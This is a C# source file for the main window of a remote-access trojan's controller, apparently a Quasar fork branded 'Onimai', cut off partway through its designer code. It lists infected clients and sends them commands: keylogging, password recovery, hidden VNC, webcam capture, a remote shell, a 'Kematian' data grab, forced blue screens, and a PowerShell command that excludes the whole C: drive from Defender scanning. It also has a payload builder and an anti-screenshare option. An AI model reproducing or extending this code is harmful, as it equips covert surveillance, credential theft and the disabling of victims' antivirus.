using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Messages.Administration.Actions;
using Quasar.Common.Messages.ClientManagement;
using Quasar.Common.Messages.FunStuff;
using Quasar.Common.Messages.Preview;
using Quasar.Common.Messages.QuickCommands;
using Quasar.Common.Messages.UserSupport.MessageBox;
using Quasar.Common.Messages.UserSupport.Website;
using Quasar.Server.Controls;
using Quasar.Server.Extensions;
using Quasar.Server.Forms.DarkMode;
using Quasar.Server.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using Quasar.Server.Properties;
using Quasar.Server.Utilities;

namespace Quasar.Server.Forms;

public class FrmMain : Form
{
    private TabControl tabControl1;
    private TabPage tabPageClients;
    private TabPage tabPageTasks;
    private ListView lstTasks;
    private Button btnAddTask;
    private Button btnEditTask;
    private Button btnDeleteTask;
    private Button btnToggleTask;

    private const int STATUS_ID = 4;

	private const int USERSTATUS_ID = 6;

	private bool _titleUpdateRunning;

	private bool _processingClientConnections;

	private readonly ClientStatusHandler _clientStatusHandler;

	private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();

	private readonly object _processingClientConnectionsLock = new object();

	private readonly object _lockClients = new object();

	private PreviewHandler _previewImageHandler;

	private IContainer components;

	private ContextMenuStrip contextMenuStrip;

	private ToolStripMenuItem connectionToolStripMenuItem;

	private ToolStripMenuItem reconnectToolStripMenuItem;

	private ImageList imgFlags;

	private ToolStripMenuItem systemToolStripMenuItem;

	private ToolStripMenuItem uninstallToolStripMenuItem;

	private ToolStripMenuItem surveillanceToolStripMenuItem;

	private ToolStripMenuItem taskManagerToolStripMenuItem;

	private ToolStripMenuItem fileManagerToolStripMenuItem;

	private ToolStripMenuItem systemInformationToolStripMenuItem;

	private ToolStripMenuItem passwordRecoveryToolStripMenuItem;

	private ToolStripMenuItem updateToolStripMenuItem;

	private ToolStripMenuItem remoteShellToolStripMenuItem;

	private ToolStripSeparator ctxtLine;

	private ToolStripMenuItem actionsToolStripMenuItem;

	private ToolStripMenuItem shutdownToolStripMenuItem;

	private ToolStripMenuItem restartToolStripMenuItem;

	private ToolStripMenuItem standbyToolStripMenuItem;

	private ToolStripMenuItem startupManagerToolStripMenuItem;

	private ToolStripMenuItem keyloggerToolStripMenuItem;

	private ToolStripMenuItem reverseProxyToolStripMenuItem;

	private ToolStripMenuItem registryEditorToolStripMenuItem;

	private NotifyIcon notifyIcon;

	private ToolStripSeparator lineToolStripMenuItem;

	private ToolStripMenuItem selectAllToolStripMenuItem;

	private ToolStripMenuItem connectionsToolStripMenuItem;

	private ToolStripMenuItem userSupportToolStripMenuItem;

	private ToolStripMenuItem showMessageboxToolStripMenuItem;

	private ToolStripMenuItem visitWebsiteToolStripMenuItem;

	private ToolStripMenuItem remoteExecuteToolStripMenuItem;

	private ToolStripMenuItem localFileToolStripMenuItem;

	private ToolStripMenuItem webFileToolStripMenuItem;

	private ToolStripMenuItem remoteDesktopToolStripMenuItem2;

	private ToolStripMenuItem hVNCToolStripMenuItem;

	private ToolStripMenuItem webcamToolStripMenuItem;

	private Label label1;

	private GroupBox gBoxClientInfo;

	private PictureBox pictureBoxMain;

	private AeroListView listView1;

	private ColumnHeader Names;

	private ColumnHeader Stats;

	private AeroListView lstClients;

	private ColumnHeader hIP;

	private ColumnHeader hTag;

	private ColumnHeader hUserPC;

	private ColumnHeader hVersion;

	private ColumnHeader hStatus;

	private ColumnHeader hUserStatus;

	private ColumnHeader hCountry;

	private ColumnHeader hOS;

	private ColumnHeader hAccountType;

	private Guna2Button guna2Button1;

	private Guna2CirclePictureBox guna2CirclePictureBox1;

	private Label label2;

	private Label listenToolStripStatusLabel;

	private Guna2Button guna2Button2;

	private Guna2Button guna2Button3;

	private Guna2Button guna2Button4;

	private Guna2Button guna2Button5;

	private ToolStripMenuItem nETCodeToolStripMenuItem;

	private ToolStripMenuItem removeOfflineClientToolStripMenuItem;

	public QuasarServer ListenServer { get; set; }

	public FrmMain()
	{
		// Show login form BEFORE initializing the main form!! pro hacker stuff here
		using (FrmLogin loginForm = new FrmLogin())
		{
			//  if (loginForm.ShowDialog() != DialogResult.OK || !loginForm.LoginSuccessful)
			//  {
			// Authentication failed
			// Application.Exit();
			//  Environment.Exit(0);
			//   return;
			//    }
			// }

			// If we get here, authentication was successful
			// Now continue with normal initialization
			_clientStatusHandler = new ClientStatusHandler();
			RegisterMessageHandler();
			InitializeComponent();
			DarkModeManager.ApplyDarkMode(this);
			this.Resize += FrmMain_Resize;
		}
	}

	private void RegisterMessageHandler()
	{
		MessageHandler.Register(_clientStatusHandler);
		_clientStatusHandler.StatusUpdated += SetStatusByClient;
		_clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
		_clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
	}

	private void UnregisterMessageHandler()
	{
		MessageHandler.Unregister(_clientStatusHandler);
		_clientStatusHandler.StatusUpdated -= SetStatusByClient;
		_clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
		_clientStatusHandler.UserActiveWindowStatusUpdated -= SetUserActiveWindowByClient;
	}

	public void UpdateWindowTitle()
	{
		if (_titleUpdateRunning)
		{
			return;
		}
		_titleUpdateRunning = true;
		try
		{
			Invoke((MethodInvoker)delegate
			{
				int count = lstClients.SelectedItems.Count;
				Text = ((count > 0) ? $"Onimai | 1.5.2 | Connected: {ListenServer.ConnectedClients.Length} [Selected: {count}]" : $"Onimai | 1.5.2 | Connected: {ListenServer.ConnectedClients.Length}");
			});
		}
		catch (Exception)
		{
		}
		_titleUpdateRunning = false;
	}

	private void InitializeServer()
	{
		if (!File.Exists(Quasar.Server.Models.Settings.CertificatePath))
		{
			using FrmCertificate frmCertificate = new FrmCertificate();
			while (frmCertificate.ShowDialog() != DialogResult.OK)
			{
			}
		}
		X509Certificate2 serverCertificate = new X509Certificate2(Quasar.Server.Models.Settings.CertificatePath);
		ListenServer = new QuasarServer(serverCertificate);
		ListenServer.ServerState += ServerState;
		ListenServer.ClientConnected += ClientConnected;
		ListenServer.ClientDisconnected += ClientDisconnected;
	}

	private void StartConnectionListener()
	{
		try
		{
			ListenServer.Listen(Quasar.Server.Models.Settings.ListenPort, Quasar.Server.Models.Settings.IPv6Support, Quasar.Server.Models.Settings.UseUPnP);
		}
		catch (SocketException ex)
		{
			if (ex.ErrorCode == 10048)
			{
				MessageBox.Show(this, "The port is already in use.", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				MessageBox.Show(this, $"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}\n\n", "Unexpected Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			ListenServer.Disconnect();
		}
		catch (Exception)
		{
			ListenServer.Disconnect();
		}
	}

	private void AutostartListening()
	{
		if (Quasar.Server.Models.Settings.AutoListen)
		{
			StartConnectionListener();
		}
		if (Quasar.Server.Models.Settings.EnableNoIPUpdater)
		{
			NoIpUpdater.Start();
		}
	}

	private void FrmMain_Load(object sender, EventArgs e)
	{
		LoadProfilePicture();
		InitializeServer();
		AutostartListening();

		// ADD THESE LINES:

		// Apply anti-screenshare if enabled
		if (Quasar.Server.Models.Settings.AntiScreenshare)
		{
			FrmSettings.ApplyAntiScreenshare(true);
		}

		// Apply auto resize UI if enabled
		if (Quasar.Server.Models.Settings.AutoResizeUI)
		{
			ApplyAutoResizeUI(true);
		}
	}

	private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
	{
		ListenServer.Disconnect();
		UnregisterMessageHandler();
		if (_previewImageHandler != null)
		{
			MessageHandler.Unregister(_previewImageHandler);
			_previewImageHandler.Dispose();
		}
		notifyIcon.Visible = false;
		notifyIcon.Dispose();
	}

	private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
	{
		UpdateWindowTitle();
		Client[] selectedClients = GetSelectedClients();
		if (selectedClients.Length == 1)
		{
			if (_previewImageHandler != null)
			{
				MessageHandler.Unregister(_previewImageHandler);
				_previewImageHandler.Dispose();
			}
			_previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, listView1);
			MessageHandler.Register(_previewImageHandler);
			GetPreviewImage message = new GetPreviewImage
			{
				Quality = 20,
				DisplayIndex = 0
			};
			selectedClients[0].Send(message);
		}
		else if (selectedClients.Length == 0)
		{
			pictureBoxMain.Image = Resources.no_previewbmp;
			listView1.Items.Clear();
			ListViewItem listViewItem = new ListViewItem("CPU");
			listViewItem.SubItems.Add("N/A");
			listView1.Items.Add(listViewItem);
			ListViewItem listViewItem2 = new ListViewItem("GPU");
			listViewItem2.SubItems.Add("N/A");
			listView1.Items.Add(listViewItem2);
			ListViewItem listViewItem3 = new ListViewItem("RAM");
			listViewItem3.SubItems.Add("0 GB");
			listView1.Items.Add(listViewItem3);
			ListViewItem listViewItem4 = new ListViewItem("Uptime");
			listViewItem4.SubItems.Add("N/A");
			listView1.Items.Add(listViewItem4);
			ListViewItem listViewItem5 = new ListViewItem("Antivirus");
			listViewItem5.SubItems.Add("N/A");
			listView1.Items.Add(listViewItem5);
		}
	}

	private void ServerState(Quasar.Server.Networking.Server server, bool listening, ushort port)
	{
		try
		{
			Invoke((MethodInvoker)delegate
			{
				if (!listening)
				{
					lstClients.Items.Clear();
				}
				listenToolStripStatusLabel.Text = (listening ? $"Listening on port: {port}. | Not Port\r\n                   Forwarded" : "Not listening.");
				listenToolStripStatusLabel.Location = (listening ? new Point(29, 158) : new Point(79, 161));
			});
			UpdateWindowTitle();
		}
		catch (InvalidOperationException)
		{
		}
	}

	private void ClientConnected(Client client)
	{
		lock (_clientConnections)
		{
			if (!ListenServer.Listening)
			{
				return;
			}
			_clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, value: true));
		}
		lock (_processingClientConnectionsLock)
		{
			if (!_processingClientConnections)
			{
				_processingClientConnections = true;
				ThreadPool.QueueUserWorkItem(ProcessClientConnections);
			}
		}
		UpdateConnectedClientsCount();
	}

	private void ClientDisconnected(Client client)
	{
		lock (_clientConnections)
		{
			if (!ListenServer.Listening)
			{
				return;
			}
			_clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, value: false));
		}
		lock (_processingClientConnectionsLock)
		{
			if (!_processingClientConnections)
			{
				_processingClientConnections = true;
				ThreadPool.QueueUserWorkItem(ProcessClientConnections);
			}
		}
		UpdateConnectedClientsCount();
	}

	private void UpdateConnectedClientsCount()
	{
	}

	private void ProcessClientConnections(object state)
	{
		while (true)
		{
			KeyValuePair<Client, bool> keyValuePair;
			lock (_clientConnections)
			{
				if (!ListenServer.Listening)
				{
					_clientConnections.Clear();
				}
				if (_clientConnections.Count == 0)
				{
					lock (_processingClientConnectionsLock)
					{
						_processingClientConnections = false;
						break;
					}
				}
				keyValuePair = _clientConnections.Dequeue();
			}
			if (!(keyValuePair.Key != null))
			{
				continue;
			}
			if (keyValuePair.Value)
			{
				AddClientToListview(keyValuePair.Key);
				if (Quasar.Server.Models.Settings.ShowPopup)
				{
					ShowPopup(keyValuePair.Key);
				}
			}
			else
			{
				UpdateClientStatusInListview(keyValuePair.Key, isConnected: false);
			}
		}
	}

	public void SetToolTipText(Client client, string text)
	{
		if (client == null)
		{
			return;
		}
		try
		{
			lstClients.Invoke((MethodInvoker)delegate
			{
				ListViewItem listViewItemByClient = GetListViewItemByClient(client);
				if (listViewItemByClient != null)
				{
					listViewItemByClient.ToolTipText = text;
				}
			});
		}
		catch (InvalidOperationException)
		{
		}
	}

	private void AddClientToListview(Client client)
	{
		if (client == null)
		{
			return;
		}
		try
		{
			lstClients.Invoke((MethodInvoker)delegate
			{
				lock (_lockClients)
				{
					ListViewItem listViewItem = lstClients.Items.Cast<ListViewItem>().FirstOrDefault((ListViewItem item) => item != null && client.Equals(item.Tag));
					if (listViewItem != null)
					{
						listViewItem.SubItems[4].Font = new Font("Segoe UI", 9f, FontStyle.Bold);
						listViewItem.SubItems[4].Text = "Online";
						listViewItem.SubItems[4].ForeColor = Color.Green;
						listViewItem.SubItems[5].Font = new Font("Segoe UI", 9f, FontStyle.Bold);
						if (listViewItem.SubItems[5].Text == "Offline")
						{
							lstClients.Items.Remove(listViewItem);
						}
					}
					else
					{
						if (lstClients.Items.Cast<ListViewItem>().Any((ListViewItem item) => item.SubItems[2].Text == client.Value.UserAtPc))
						{
							ListViewItem listViewItem2 = lstClients.Items.Cast<ListViewItem>().FirstOrDefault((ListViewItem item) => item.SubItems[2].Text == client.Value.UserAtPc && item.SubItems[4].Text == "Offline");
							if (listViewItem2 != null)
							{
								lstClients.Items.Remove(listViewItem2);
							}
						}
						ListViewItem listViewItem3 = new ListViewItem(new string[10]
						{
							client.EndPoint.Address.ToString(),
							client.Value.Tag,
							client.Value.UserAtPc,
							client.Value.Version,
							"Online",
							"Active",
							client.Value.CountryWithCode,
							client.Value.OperatingSystem,
							client.Value.AccountType,
							"Offline"
						})
						{
							Tag = client,
							UseItemStyleForSubItems = false
						};
						if (client.Value.Version != "1.8.2")
						{
							listViewItem3.SubItems[3].Font = new Font("Segoe UI", 9f, FontStyle.Bold);
							listViewItem3.SubItems[3].ForeColor = Color.Red;
							listViewItem3.SubItems[4].Font = new Font("Segoe UI", 9f, FontStyle.Bold);
							listViewItem3.SubItems[4].ForeColor = Color.Green;
						}
						else
						{
							listViewItem3.SubItems[3].Font = new Font("Segoe UI", 9f, FontStyle.Bold);
							listViewItem3.SubItems[3].ForeColor = Color.Green;
							listViewItem3.SubItems[4].Font = new Font("Segoe UI", 9f, FontStyle.Bold);
							listViewItem3.SubItems[4].ForeColor = Color.Green;
						}
						listViewItem3.ImageIndex = client.Value.ImageIndex;
						lstClients.Items.Add(listViewItem3);
					}
				}
			});
			UpdateWindowTitle();
		}
		catch (InvalidOperationException)
		{
		}
	}

	private void UpdateClientStatusInListview(Client client, bool isConnected)
	{
		if (client == null)
		{
			return;
		}
		try
		{
			lstClients.Invoke((MethodInvoker)delegate
			{
				lock (_lockClients)
				{
					using IEnumerator<ListViewItem> enumerator = (from ListViewItem lvi in lstClients.Items
																  where lvi != null && client.Equals(lvi.Tag)
																  select lvi).GetEnumerator();
					if (enumerator.MoveNext())
					{
						ListViewItem current = enumerator.Current;
						if (isConnected)
						{
							current.SubItems[4].Font = new Font("Segoe UI", 9f, FontStyle.Bold);
							current.SubItems[4].Text = "Online";
							current.SubItems[4].ForeColor = Color.Green;
						}
						else
						{
							current.SubItems[4].Font = new Font("Segoe UI", 9f, FontStyle.Bold);
							current.SubItems[4].Text = "Offline";
							current.SubItems[4].ForeColor = Color.Red;
						}
					}
				}
			});
			UpdateWindowTitle();
		}
		catch (InvalidOperationException)
		{
		}
	}

	private void SetStatusByClient(object sender, Client client, string text)
	{
		ListViewItem listViewItemByClient = GetListViewItemByClient(client);
		if (listViewItemByClient != null)
		{
			listViewItemByClient.SubItems[4].Text = text;
		}
	}

	private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
	{
		ListViewItem listViewItemByClient = GetListViewItemByClient(client);
		if (listViewItemByClient != null)
		{
			listViewItemByClient.SubItems[6].Text = userStatus.ToString();
		}
	}

	private void SetUserActiveWindowByClient(object sender, Client client, string newWindow)
	{
	}

	private ListViewItem GetListViewItemByClient(Client client)
	{
		if (client == null)
		{
			return null;
		}
		ListViewItem itemClient = null;
		lstClients.Invoke((MethodInvoker)delegate
		{
			itemClient = lstClients.Items.Cast<ListViewItem>().FirstOrDefault((ListViewItem lvi) => lvi != null && client.Equals(lvi.Tag));
		});
		return itemClient;
	}

	private Client[] GetSelectedClients()
	{
		List<Client> clients = new List<Client>();
		lstClients.Invoke((MethodInvoker)delegate
		{
			lock (_lockClients)
			{
				if (lstClients.SelectedItems.Count != 0)
				{
					clients.AddRange(from ListViewItem lvi in lstClients.SelectedItems
									 where lvi != null
									 select lvi.Tag as Client);
				}
			}
		});
		return clients.ToArray();
	}

	private void ShowPopup(Client c)
	{
		try
		{
			Invoke((MethodInvoker)delegate
			{
				if (!(c == null) && c.Value != null)
				{
					notifyIcon.Visible = true;
					notifyIcon.ShowBalloonTip(4000, $"Client connected from {c.Value.Country}!", $"IP Address: {c.EndPoint.Address.ToString()}\nOperating System: {c.Value.OperatingSystem}", ToolTipIcon.Info);
					notifyIcon.Visible = false;
				}
			});
		}
		catch (InvalidOperationException)
		{
		}
	}

	private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			selectedClients[i].Send(new DoAskElevate());
		}
	}

	private void updateToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		if (selectedClients.Length != 0)
		{
			new FrmRemoteExecution(selectedClients).Show();
		}
	}

	private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			selectedClients[i].Send(new DoClientReconnect());
		}
	}

	private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			selectedClients[i].Send(new DoClientDisconnect());
		}
	}

	private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (lstClients.SelectedItems.Count != 0 && MessageBox.Show($"Are you sure you want to uninstall the client on {lstClients.SelectedItems.Count} computer\\s?", "Uninstall Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
		{
			Client[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				selectedClients[i].Send(new DoClientUninstall());
			}
		}
	}

	private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			FrmSystemInformation frmSystemInformation = FrmSystemInformation.CreateNewOrGetExisting(selectedClients[i]);
			frmSystemInformation.Show();
			frmSystemInformation.Focus();
		}
	}

	private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			FrmFileManager frmFileManager = FrmFileManager.CreateNewOrGetExisting(selectedClients[i]);
			frmFileManager.Show();
			frmFileManager.Focus();
		}
	}

	private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			FrmStartupManager frmStartupManager = FrmStartupManager.CreateNewOrGetExisting(selectedClients[i]);
			frmStartupManager.Show();
			frmStartupManager.Focus();
		}
	}

	private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			FrmTaskManager frmTaskManager = FrmTaskManager.CreateNewOrGetExisting(selectedClients[i]);
			frmTaskManager.Show();
			frmTaskManager.Focus();
		}
	}

	private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			FrmRemoteShell frmRemoteShell = FrmRemoteShell.CreateNewOrGetExisting(selectedClients[i]);
			frmRemoteShell.Show();
			frmRemoteShell.Focus();
		}
	}

	private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			FrmConnections frmConnections = FrmConnections.CreateNewOrGetExisting(selectedClients[i]);
			frmConnections.Show();
			frmConnections.Focus();
		}
	}

	private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		if (selectedClients.Length != 0)
		{
			new FrmReverseProxy(selectedClients).Show();
		}
	}

	private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (lstClients.SelectedItems.Count != 0)
		{
			Client[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				FrmRegistryEditor frmRegistryEditor = FrmRegistryEditor.CreateNewOrGetExisting(selectedClients[i]);
				frmRegistryEditor.Show();
				frmRegistryEditor.Focus();
			}
		}
	}

	private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		if (selectedClients.Length != 0)
		{
			new FrmRemoteExecution(selectedClients).Show();
		}
	}

	private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		if (selectedClients.Length != 0)
		{
			new FrmRemoteExecution(selectedClients).Show();
		}
	}

	private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			selectedClients[i].Send(new DoShutdownAction
			{
				Action = ShutdownAction.Shutdown
			});
		}
	}

	private void restartToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			selectedClients[i].Send(new DoShutdownAction
			{
				Action = ShutdownAction.Restart
			});
		}
	}

	private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			selectedClients[i].Send(new DoShutdownAction
			{
				Action = ShutdownAction.Standby
			});
		}
	}

	private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			FrmRemoteDesktop frmRemoteDesktop = FrmRemoteDesktop.CreateNewOrGetExisting(selectedClients[i]);
			frmRemoteDesktop.Show();
			frmRemoteDesktop.Focus();
		}
	}

	private void hVNCToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			FrmHVNC frmHVNC = FrmHVNC.CreateNewOrGetExisting(selectedClients[i]);
			frmHVNC.Show();
			frmHVNC.Focus();
		}
	}

	private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		if (selectedClients.Length != 0)
		{
			new FrmPasswordRecovery(selectedClients).Show();
		}
	}

	private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			FrmKeylogger frmKeylogger = FrmKeylogger.CreateNewOrGetExisting(selectedClients[i]);
			frmKeylogger.Show();
			frmKeylogger.Focus();
		}
	}

	private void kematianGrabbingToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			new KematianHandler(selectedClients[i]).RequestKematianZip();
		}
	}

	private void webcamToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			FrmRemoteWebcam frmRemoteWebcam = FrmRemoteWebcam.CreateNewOrGetExisting(selectedClients[i]);
			frmRemoteWebcam.Show();
			frmRemoteWebcam.Focus();
		}
	}

	private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (lstClients.SelectedItems.Count == 0)
		{
			return;
		}
		using FrmVisitWebsite frmVisitWebsite = new FrmVisitWebsite(lstClients.SelectedItems.Count);
		if (frmVisitWebsite.ShowDialog() == DialogResult.OK)
		{
			Client[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				selectedClients[i].Send(new DoVisitWebsite
				{
					Url = frmVisitWebsite.Url,
					Hidden = frmVisitWebsite.Hidden
				});
			}
		}
	}

	private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (lstClients.SelectedItems.Count == 0)
		{
			return;
		}
		using FrmShowMessagebox frmShowMessagebox = new FrmShowMessagebox(lstClients.SelectedItems.Count);
		if (frmShowMessagebox.ShowDialog() == DialogResult.OK)
		{
			Client[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				selectedClients[i].Send(new DoShowMessageBox
				{
					Caption = frmShowMessagebox.MsgBoxCaption,
					Text = frmShowMessagebox.MsgBoxText,
					Button = frmShowMessagebox.MsgBoxButton,
					Icon = frmShowMessagebox.MsgBoxIcon
				});
			}
		}
	}

	private void addCDriveExceptionToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string command = "Add-MpPreference -ExclusionPath C:\\";
		DoSendQuickCommand message = new DoSendQuickCommand
		{
			Command = command
		};
		Client[] selectedClients = GetSelectedClients();
		foreach (Client client in selectedClients)
		{
			if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
			{
				client.Send(message);
			}
			else
			{
				MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
	}

	private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			selectedClients[i].Send(new DoBSOD());
		}
	}

	private void swapMouseButtonsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			selectedClients[i].Send(new DoSwapMouseButtons());
		}
	}

	private void hideTaskBarToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Client[] selectedClients = GetSelectedClients();
		for (int i = 0; i < selectedClients.Length; i++)
		{
			selectedClients[i].Send(new DoHideTaskbar());
		}
	}

	private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
	{
		lstClients.SelectAllItems();
	}

	private void closeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		using FrmSettings frmSettings = new FrmSettings(ListenServer);
		frmSettings.ShowDialog();
	}

	private void builderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		using FrmBuilder frmBuilder = new FrmBuilder();
		frmBuilder.ShowDialog();
	}

	private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		using FrmAbout frmAbout = new FrmAbout();
		frmAbout.ShowDialog();
	}

	private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
	{
	}

	private void contextMenuStrip_Opening(object sender, CancelEventArgs e)
	{
	}

	private void guna2Button1_Click(object sender, EventArgs e)
	{
		using FrmBuilder frmBuilder = new FrmBuilder();
		frmBuilder.ShowDialog();
	}

	private void guna2Button3_Click(object sender, EventArgs e)
	{
		using FrmAbout frmAbout = new FrmAbout();
		frmAbout.ShowDialog();
	}

	private void guna2Button5_Click(object sender, EventArgs e)
	{
		using FrmSettings frmSettings = new FrmSettings(ListenServer);
		frmSettings.Owner = this;  // ADD THIS LINE - allows settings to call ReloadProfilePicture()
		frmSettings.ShowDialog();
	}

	private void guna2Button4_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void guna2Button2_Click(object sender, EventArgs e)
	{
		MessageBox.Show("No updates are available.");
	}

	private void removeOfflineClientToolStripMenuItem_Click(object sender, EventArgs e)
	{
		// Remove offline clients from the main client list (lstClients), not listView1
		for (int num = lstClients.Items.Count - 1; num >= 0; num--)
		{
			if (lstClients.Items[num].SubItems.Count > 4 &&
				lstClients.Items[num].SubItems[4].Text.Equals("Offline", StringComparison.OrdinalIgnoreCase))
			{
				lstClients.Items.RemoveAt(num);
			}
		}

		// Update the window title after removing offline clients
		UpdateWindowTitle();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Quasar.Server.Forms.FrmMain));
		System.Windows.Forms.ListViewItem listViewItem = new System.Windows.Forms.ListViewItem("CPU");
		System.Windows.Forms.ListViewItem listViewItem2 = new System.Windows.Forms.ListViewItem("GPU");
		System.Windows.Forms.ListViewItem listViewItem3 = new System.Windows.Forms.ListViewItem("RAM");
		System.Windows.Forms.ListViewItem listViewItem4 = new System.Windows.Forms.ListViewItem("Uptime");
		System.Windows.Forms.ListViewItem listViewItem5 = new System.Windows.Forms.ListViewItem("Antivirus");
		Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter = new Quasar.Server.Utilities.ListViewColumnSorter();
		Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter2 = new Quasar.Server.Utilities.ListViewColumnSorter();
		this.contextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.systemInformationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.fileManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.startupManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.taskManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.remoteShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.connectionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.reverseProxyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
